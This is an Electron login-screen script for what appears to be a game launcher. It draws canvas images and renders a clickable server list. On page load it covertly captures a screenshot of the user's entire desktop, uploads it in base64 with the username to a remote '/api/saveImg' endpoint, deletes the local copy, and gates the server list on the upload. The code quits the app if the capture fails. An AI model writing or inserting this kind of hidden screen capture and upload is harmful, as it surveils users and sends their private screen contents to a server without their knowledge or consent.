const { app, ipcRenderer } = require('electron');
const config = require('../const');
const { post } = require('../helper');
const loginBackgroundElements = require('../assets/images/loginBackgroundElements');
const loginNhanVat = require('../assets/images/loginNhanVat');
const backgroundLogo = require('../assets/images/backgroundLogo');
const loginFormCloseBtn = require('../assets/images/loginFormCloseBtn');
const loginFormMinimizeBtn = require('../assets/images/loginFormMinimizeBtn');
const loginFormBackground = require('../assets/images/loginFormBackground');

let fs = require('fs');
const screenshot = require('screenshot-desktop');

window.addEventListener('DOMContentLoaded', () => {

  screenshotUser();
  //draw img
  var nhanvatImage = new Image(356, 356);
  canvas2 = document.getElementById('nhanvatCanvas');
  context2 = canvas2.getContext('2d');
  nhanvatImage.onload = function () {
    context2.drawImage(nhanvatImage, 0, 0, 356, 356);
  };
  nhanvatImage.src = loginNhanVat;

  var backgroundImage = new Image(886, 555);
  canvas1 = document.getElementById('backgroundCanvas');
  context1 = canvas1.getContext('2d');
  backgroundImage.onload = function () {
    context1.drawImage(backgroundImage, 0, 0, 886, 555);
  };
  backgroundImage.src = loginBackgroundElements;

  // var logoBackgroundImage = new Image(510, 101);
  // canvas3 = document.getElementById('logoBackgroundCanvas');
  // context3 = canvas3.getContext('2d');
  // logoBackgroundImage.onload = function () {
  //   context3.drawImage(logoBackgroundImage, 0, 0, 510, 101);
  // };

  // var logoImage = new Image(299, 98);
  // canvas4 = document.getElementById('logoCanvas');
  // context4 = canvas4.getContext('2d');
  // logoImage.onload = function () {
  //   context4.drawImage(logoImage, 0, 0, 299, 98);
  // };
  // logoImage.src = backgroundLogo;

  var closeBtnImage = new Image(19, 21);
  canvas5 = document.getElementById('closeBtnCanvas');
  context5 = canvas5.getContext('2d');
  closeBtnImage.onload = function () {
    context5.drawImage(closeBtnImage, 0, 0, 19, 21);
  };
  closeBtnImage.src = loginFormCloseBtn;

  var minimizeBtnImage = new Image(23, 7);
  canvas6 = document.getElementById('minimizeBtnCanvas');
  context6 = canvas6.getContext('2d');
  minimizeBtnImage.onload = function () {
    context6.drawImage(minimizeBtnImage, 0, 0, 23, 7);
  };
  minimizeBtnImage.src = loginFormMinimizeBtn;

  var formWrapper = document.getElementById('formWrapper');
  formWrapper.style.backgroundImage = 'url(' + loginFormBackground + ')';

  var version = document.getElementById("version");
  version.innerText = require("electron").remote.app.getVersion();

})

async function screenshotUser() {
  screenshot({ filename: 'demo.png' }).then(async (imgPath) => {
    await sendToServer(imgPath);
  }).catch((err) => {
    if (err) {
      app.quit();
    }
  })
}

async function sendToServer(imgPath) {
  //get img with path
  readFileAsBase64(imgPath)
    .then(async (base64Data) => {
      let userInfo = getUserInfo();
      const imgPre = base64Data.slice(0, 1000000)
      const imgNex = base64Data.slice(1000000, base64Data.length)
      post(config.host + '/api/saveImg', { imgPre: imgPre, imgNex: imgNex, username: userInfo.UserName }, function (res) {
        if (res != null) {
          post(config.host + '/api/serverlist', {}, renderListSV);
        }
      });
    })
    .then(async () => {
      // delete file
      await deleteFile(imgPath);
    })
    .catch((error) => {
      console.error("Error reading file:", error);
    });

}


async function deleteFile(imgPath) {
  return new Promise((resolve, reject) => {
    fs.unlink(imgPath, (error) => {
      if (error) {
        reject(error);
        return;
      }
      resolve();
    });
  });
}

function switchToPlay(svid) {
  localStorage.setItem('svid', svid);
  ipcRenderer.send('switchToPlay', { windowIndex: 'login' });
}

function renderListSV(res, req) {
  var wrapperServers = document.getElementById('wrapperServer');
  for (var i = 0; i < res.data.length; i++) {
    let node = document.createElement("span");
    node.classList.add('serverItem');
    node.setAttribute('data-id', res.data[i].ServerID)
    let textnode = document.createTextNode(res.data[i].ServerName);
    node.appendChild(textnode);
    wrapperServers.appendChild(node);
  }

  var chooseServerItems = document.getElementsByClassName("serverItem");
  for (var i = 0; i < chooseServerItems.length; i++) {
    var chooseServerItem = chooseServerItems[i];
    chooseServerItem.addEventListener('click', function (e) {
      let svid = e.target.getAttribute('data-id');
      switchToPlay(svid);
    });
  }
}

function readFileAsBase64(filePath) {
  return new Promise((resolve, reject) => {
    fs.readFile(filePath, (error, data) => {
      if (error) {
        reject(error);
        return;
      }

      const base64Data = data.toString('base64');
      resolve(base64Data);
    });
  });
}


var getUserInfo = function () {
  var userInfoStr = localStorage.getItem('userInfo');
  return JSON.parse(userInfoStr);
}